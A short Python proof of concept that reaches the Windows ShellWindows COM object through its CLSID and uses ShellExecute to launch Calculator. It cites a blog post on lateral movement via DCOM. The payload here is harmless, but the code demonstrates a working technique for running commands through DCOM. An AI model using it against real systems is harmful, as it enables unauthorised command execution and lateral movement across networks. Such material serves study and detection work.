import win32com.client

#ShellWindows   {9BA05972-F6A8-11CF-A442-00A0C90A8F39}

obj = win32com.client.Dispatch("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
obj[0].Document.Application.ShellExecute("calc")




# Reference https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
